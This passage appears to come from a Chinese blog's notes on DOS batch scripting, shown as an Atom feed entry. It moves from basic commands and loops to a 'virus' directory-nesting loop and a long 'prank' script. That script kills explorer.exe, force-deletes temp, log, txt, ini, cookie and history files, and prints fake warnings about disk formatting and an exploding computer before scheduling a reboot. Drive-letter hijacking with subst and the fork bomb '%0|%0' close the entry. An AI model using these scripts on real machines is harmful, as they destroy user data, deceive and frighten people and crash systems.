删除一个目录树</span><br><span class="line">&#x2F;q  安静模式  不进行提示</span><br><span class="line">redir  test</span><br></pre></td></tr></table></figure><h3 id="目录切换"><a href="#目录切换" class="headerlink" title="目录切换"></a>目录切换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd  </span><br><span class="line">.当前目录</span><br><span class="line">..上一级目录</span><br></pre></td></tr></table></figure><h3 id="目录重命名"><a href="#目录重命名" class="headerlink" title="目录重命名"></a>目录重命名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ren 重命名</span><br><span class="line">rename</span><br><span class="line">ren test test1 重命名为test1</span><br><span class="line">ren path name1 name2</span><br><span class="line">如果为当前目录下  则不用夹path</span><br></pre></td></tr></table></figure><h3 id="目录复制"><a href="#目录复制" class="headerlink" title="目录复制"></a>目录复制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy</span><br><span class="line">copy test2 test1 将test2中的文件复制到test1中</span><br></pre></td></tr></table></figure><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">del</span><br><span class="line">del path  *.txt 删除该路径下所有的txt文件</span><br></pre></td></tr></table></figure><h3 id="文件移动"><a href="#文件移动" class="headerlink" title="文件移动"></a>文件移动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move</span><br><span class="line">移动文件并重命名文件和目录</span><br></pre></td></tr></table></figure><h2 id="网络相关命令"><a href="#网络相关命令" class="headerlink" title="网络相关命令"></a>网络相关命令</h2><h3 id="用户操作命令"><a href="#用户操作命令" class="headerlink" title="用户操作命令"></a>用户操作命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br><span class="line">&#x2F;&#x2F;创建并修改计算机上的用户账户</span><br><span class="line">net user &#x2F;add 新增</span><br><span class="line">net user &#x2F;delete 删除</span><br></pre></td></tr></table></figure><h3 id="用户组操作命令"><a href="#用户组操作命令" class="headerlink" title="用户组操作命令"></a>用户组操作命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net localgroup  admin指的是用户</span><br><span class="line">net localgruop user admin &#x2F;delete 删除</span><br><span class="line">net localgroup administrators admin  &#x2F;add 添加</span><br></pre></td></tr></table></figure><h3 id="网络联通检测命令"><a href="#网络联通检测命令" class="headerlink" title="网络联通检测命令"></a>网络联通检测命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ping</span><br><span class="line">ping www.baidu.com  </span><br><span class="line">ping 127.0.0.1  用来检测本地ip协议栈是否运行正常</span><br></pre></td></tr></table></figure><h3 id="网络连接命令"><a href="#网络连接命令" class="headerlink" title="网络连接命令"></a>网络连接命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 进行端口连接 和主机的测试</span><br></pre></td></tr></table></figure><h3 id="路由信息查看命令"><a href="#路由信息查看命令" class="headerlink" title="路由信息查看命令"></a>路由信息查看命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tracert</span><br><span class="line">tracert 192.168.0.1</span><br><span class="line">tracert www.baidu.com</span><br></pre></td></tr></table></figure><h3 id="网络适配器命令"><a href="#网络适配器命令" class="headerlink" title="网络适配器命令"></a>网络适配器命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure><h3 id="ARP信息命令"><a href="#ARP信息命令" class="headerlink" title="ARP信息命令"></a>ARP信息命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp</span><br><span class="line">显示和修改地址解析协议（arp）使用的ip到物理的地址转换表</span><br></pre></td></tr></table></figure><h2 id="条件判断结构"><a href="#条件判断结构" class="headerlink" title="条件判断结构"></a>条件判断结构</h2><h3 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">set var&#x3D;hello</span><br><span class="line">if %var%&#x3D;&#x3D;hello (echo ok) else (echo no)</span><br><span class="line">pause</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;去掉请按任意键继续</span><br><span class="line">pause&gt;nul 输出到空设备</span><br></pre></td></tr></table></figure><h3 id="文件是否存在判断"><a href="#文件是否存在判断" class="headerlink" title="文件是否存在判断"></a>文件是否存在判断</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exist 判断是否存在</span><br><span class="line"></span><br><span class="line">@echo off</span><br><span class="line">rem 用来判断当前文件是否存在</span><br><span class="line">if exist C:\\.... (echo ok) else (echo no)</span><br><span class="line"></span><br><span class="line">pause&gt;nul</span><br></pre></td></tr></table></figure><h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><h3 id="遍历目录"><a href="#遍历目录" class="headerlink" title="遍历目录"></a>遍历目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;eg:1  for &#x2F;d %%名称 in (路径&#x2F;*) do具体操作</span><br><span class="line">for &#x2F;d %%a in (*) do echo %%a</span><br><span class="line">&#x2F;&#x2F;eg:2</span><br><span class="line">for &#x2F;d %%a in (*) do if %%a&#x3D;&#x3D;test rd %%a</span><br><span class="line"></span><br><span class="line">for只会遍历文件夹或者目录  不会遍历文件</span><br></pre></td></tr></table></figure><h3 id="遍历目录和子目录下文件"><a href="#遍历目录和子目录下文件" class="headerlink" title="遍历目录和子目录下文件"></a>遍历目录和子目录下文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;r &quot;目录路径&quot; %%v in (匹配规则 例如*.py) </span><br><span class="line">do 执行操作 %%v</span><br></pre></td></tr></table></figure><h3 id="遍历数字"><a href="#遍历数字" class="headerlink" title="遍历数字"></a>遍历数字</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %%v in (start,step,end) do 具体操作</span><br></pre></td></tr></table></figure><h3 id="遍历文件内容"><a href="#遍历文件内容" class="headerlink" title="遍历文件内容"></a>遍历文件内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;f %%v in(文件名) do 具体操作</span><br></pre></td></tr></table></figure><h2 id="virus脚本分析"><a href="#virus脚本分析" class="headerlink" title="virus脚本分析"></a>virus脚本分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">:loop</span><br><span class="line">md virus</span><br><span class="line">cd virus</span><br><span class="line">goto loop</span><br><span class="line">pause&gt;nul</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h2 id="交互操作"><a href="#交互操作" class="headerlink" title="交互操作"></a>交互操作</h2><h3 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">goto跳转语句</span><br><span class="line"></span><br><span class="line">:first &#x2F;&#x2F;命名代码块</span><br><span class="line">set &#x2F;p opt&#x3D;</span><br><span class="line">if %opt%&#x3D;&#x3D;1 goto one</span><br><span class="line">if %opt%&#x3D;&#x3D;2 goto two</span><br><span class="line">echo Invalid option</span><br><span class="line">goto first</span><br><span class="line"></span><br><span class="line">:one</span><br><span class="line">echo your choice one</span><br><span class="line">pause&gt;nul</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">:two</span><br><span class="line">echo your choice two</span><br><span class="line">pause&gt;nul</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h3 id="计划执行"><a href="#计划执行" class="headerlink" title="计划执行"></a>计划执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">at 10:00 AM &#x2F;every:SU,M,TU,W,TH,F,SA &quot;C:\1.bat&quot;</span><br><span class="line">也可以设置定时关机</span><br></pre></td></tr></table></figure><h2 id="恶搞程序"><a href="#恶搞程序" class="headerlink" title="恶搞程序"></a>恶搞程序</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"> color 4f</span><br><span class="line"></span><br><span class="line"> taskkill /im explorer.exe /f</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 删除C盘所有文件......</span><br><span class="line"></span><br><span class="line"> del /f /s /q <span class="string">&quot;%systemdrive%\*.tmp&quot;</span></span><br><span class="line"></span><br><span class="line"> del /f /s /q <span class="string">&quot;%systemdrive%\*.dmp&quot;</span></span><br><span class="line"></span><br><span class="line"> del /f /s /q <span class="string">&quot;%systemdrive%\*._mp&quot;</span></span><br><span class="line"></span><br><span class="line"> del /f /s /q <span class="string">&quot;%systemdrive%\*.gid&quot;</span></span><br><span class="line"></span><br><span class="line"> del /f /s /q <span class="string">&quot;%systemdrive%\*.old&quot;</span></span><br><span class="line"></span><br><span class="line"> del /f /s /q <span class="string">&quot;%systemdrive%\*.chk&quot;</span></span><br><span class="line"></span><br><span class="line"> del /f /s /q <span class="string">&quot;%systemdrive%\*.bak&quot;</span></span><br><span class="line"></span><br><span class="line"> del /f /s /q <span class="string">&quot;%systemdrive%\*.log&quot;</span></span><br><span class="line"></span><br><span class="line"> del /f /s /q <span class="string">&quot;%systemdrive%\*.txt&quot;</span></span><br><span class="line"></span><br><span class="line"> del /f /s /q <span class="string">&quot;%systemdrive%\*.ini&quot;</span></span><br><span class="line"></span><br><span class="line"> del /f /s /q <span class="string">&quot;%systemdrive%\Recycled\*.*&quot;</span></span><br><span class="line"></span><br><span class="line"> del /f /s /q <span class="string">&quot;%systemdrive%\RECYCLER\*.*&quot;</span></span><br><span class="line"></span><br><span class="line"> del /f /s /q <span class="string">&quot;%windir%\inf\*.pnf&quot;</span></span><br><span class="line"></span><br><span class="line"> del /f /s /q <span class="string">&quot;%windir%\Prefetch\*.*&quot;</span></span><br><span class="line"></span><br><span class="line"> @ping -n 2 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> rd /s /q <span class="string">&quot;%windir%\Downloaded Program Files&quot;</span> &amp; md <span class="string">&quot;%windir%\Downloaded Program Files&quot;</span></span><br><span class="line"></span><br><span class="line"> @ping -n 2 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> rd /s /q <span class="string">&quot;%windir%\LastGood&quot;</span> &amp; md <span class="string">&quot;%windir%\LastGood&quot;</span></span><br><span class="line"></span><br><span class="line"> @ping -n 2 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> rd /s /q <span class="string">&quot;%windir%\Offline Web Pages&quot;</span> &amp; md <span class="string">&quot;%windir%\Offline Web Pages&quot;</span></span><br><span class="line"></span><br><span class="line"> @ping -n 2 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> rd /s /q <span class="string">&quot;%windir%\SoftwareDistribution\Download&quot;</span> &amp; md <span class="string">&quot;%windir%\SoftwareDistribution\Download&quot;</span></span><br><span class="line"></span><br><span class="line"> @ping -n 2 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> rd /s /q <span class="string">&quot;%windir%\temp&quot;</span> &amp; md <span class="string">&quot;%windir%\temp&quot;</span></span><br><span class="line"></span><br><span class="line"> @ping -n 2 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> rd /s /q <span class="string">&quot;%userprofile%\Local Settings\Application Data\Microsoft\Media Player&quot;</span> &amp; md <span class="string">&quot;%windir%\Local Settings\Application Data\Microsoft\Media Player&quot;</span></span><br><span class="line"></span><br><span class="line"> @ping -n 2 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> rd /s /q <span class="string">&quot;%userprofile%\UserData&quot;</span> &amp; md <span class="string">&quot;%windir%\UserData&quot;</span></span><br><span class="line"></span><br><span class="line"> @ping -n 2 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> rd /s /q <span class="string">&quot;%appdata%\Adobe&quot;</span> &amp; md <span class="string">&quot;%windir%\Adobe&quot;</span></span><br><span class="line"></span><br><span class="line"> @ping -n 2 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> rd /s /q <span class="string">&quot;%appdata%\Macromedia&quot;</span> &amp; md <span class="string">&quot;%windir%\Macromedia&quot;</span></span><br><span class="line"></span><br><span class="line"> @ping -n 2 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> rd /s /q <span class="string">&quot;%appdata%\Microsoft\Media Player&quot;</span> &amp; md <span class="string">&quot;%windir%\Microsoft\Media Player&quot;</span></span><br><span class="line"></span><br><span class="line"> @ping -n 2 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> rd /s /q <span class="string">&quot;%appdata%\Microsoft\Office\Recent&quot;</span> &amp; md <span class="string">&quot;%windir%\Microsoft\Office\Recent&quot;</span></span><br><span class="line"></span><br><span class="line"> @ping -n 5 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> del /a /f /s /q <span class="string">&quot;%userprofile%\Cookies\*.*&quot;</span></span><br><span class="line"></span><br><span class="line"> del /a /f /s /q <span class="string">&quot;%userprofile%\Recent\*.*&quot;</span></span><br><span class="line"></span><br><span class="line"> del /a /f /s /q <span class="string">&quot;%userprofile%\Local Settings\Application Data\GDIPFONTCACHEV1.dat&quot;</span></span><br><span class="line"></span><br><span class="line"> del /a /f /s /q <span class="string">&quot;%userprofile%\Local Settings\Application Data\IconCache.db&quot;</span></span><br><span class="line"></span><br><span class="line"> del /a /f /s /q <span class="string">&quot;%userprofile%\Local Settings\History\*.*&quot;</span></span><br><span class="line"></span><br><span class="line"> del /a /f /s /q <span class="string">&quot;%userprofile%\Local Settings\Temporary Internet Files\*.*&quot;</span></span><br><span class="line"></span><br><span class="line"> del /a /f /s /q <span class="string">&quot;%temp%\*.*&quot;</span> del /a /f /s /q <span class="string">&quot;%userprofile%\AppData\Local\GDIPFONTCACHEV1.dat&quot;</span></span><br><span class="line"></span><br><span class="line"> del /a /f /s /q <span class="string">&quot;%userprofile%\AppData\Local\IconCache.db&quot;</span></span><br><span class="line"></span><br><span class="line"> del /a /f /s /q <span class="string">&quot;%userprofile% \AppData\Local\Microsoft\Windows\History\*.*&quot;</span></span><br><span class="line"></span><br><span class="line"> del /a /f /s /q <span class="string">&quot;%userprofile% \AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*&quot;</span></span><br><span class="line"></span><br><span class="line"> del /a /f /s /q <span class="string">&quot;%userprofile% \AppData\Roaming\Microsoft\Windows\Cookies\*.*&quot;</span></span><br><span class="line"></span><br><span class="line"> del /a /f /s /q <span class="string">&quot;%userprofile% \AppData\Roaming\Microsoft\Windows\Recent\*.*&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 已删除完毕</span><br><span class="line"></span><br><span class="line"> @<span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 删除D盘所有文件......</span><br><span class="line"></span><br><span class="line"> @ping -n 3 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> @<span class="built_in">echo</span> 已删除完毕</span><br><span class="line"></span><br><span class="line"> @<span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 删除E盘所有文件......</span><br><span class="line"></span><br><span class="line"> @ping -n 3 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 已删除完毕</span><br><span class="line"></span><br><span class="line"> @<span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 正在低级格式化全部硬盘......</span><br><span class="line"></span><br><span class="line"> @ping -n 3 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 正在 进行二次 低格硬盘......</span><br><span class="line"></span><br><span class="line"> ping -n 3 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 正在 进行三次 低格硬盘......</span><br><span class="line"></span><br><span class="line"> ping -n 3 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 正在 进行四次 低格硬盘......</span><br><span class="line"></span><br><span class="line"> ping -n 3 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 正在 进行五次 低格硬盘......</span><br><span class="line"></span><br><span class="line"> ping -n 3 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 注意: cpu温度127度!温度过高报警!!!</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"> ping -n 2 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 注意: 硬盘温度86度!温度过高报警!!!</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"> ping -n 2 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 注意: 显卡温度96度!温度过高报警!!!</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"> ping -n 2 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 注意: 系统崩溃, 主板温度 超过临界值!!! <span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 注意: 电容负荷超过99% <span class="built_in">echo</span>. &amp; pause</span><br><span class="line"></span><br><span class="line"> <span class="built_in">echo</span> 电脑将在60秒内崩溃或爆炸!请勿强行关闭电源!否则会 导致cpu和硬盘彻底损毁!!</span><br><span class="line"></span><br><span class="line"> shutdown /r /t 60 /c <span class="string">&quot;电脑将在60秒内崩溃或爆炸!请勿强行关闭电源!否则会 导致cpu和硬盘彻底损毁!!&quot;</span></span><br><span class="line"></span><br><span class="line"> ping -n 30 127.1&gt;nul</span><br><span class="line"></span><br><span class="line"> shutdown -a</span><br><span class="line"></span><br><span class="line"> start explorer.exe</span><br><span class="line"></span><br><span class="line"> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>恶搞命令：</p><p>SUBST O: D:\1<br>就可以建一个O盘，把O盘的路径设为D:\1文件夹，就是双击O盘时打开D:\1文件夹，但是路径还是O:<br>去掉O盘的方法是：SUBST O: /D</p><p>盘符增加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> %%i <span class="keyword">in</span> (a b c d e f g h i j k l m n o p q r s t u v w x y z) <span class="keyword">do</span> (subst %%i: C:\)</span><br></pre></td></tr></table></figure><p>盘符恢复</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> %%i <span class="keyword">in</span> (a b c d e f g h i j k l m n o p q r s t u v w x y z) <span class="keyword">do</span> (subst %%i: /d)</span><br></pre></td></tr></table></figure><p>死机循环</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0|%0</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Dos批处理脚本学习&quot;&gt;&lt;a href=&quot;#Dos批处理脚本学习&quot; class=&quot;headerlink&quot; title=&quot;Dos批处理脚本学习&quot;&gt;&lt;/a&gt;Dos批处理脚本学习&lt;/h1&gt;&lt;h2 id=&quot;入门概述&quot;&gt;&lt;a href=&quot;#入门概述&quot; class=&quot;head</summary>
      
    
    
    
    <category term="知识积累" scheme="https://a2914475618.github.io/categories/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"/>
    
    
    <category term="bat批处理" scheme="https://a2914475618.github.io/tags/bat%E6%89%B9%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
</feed>
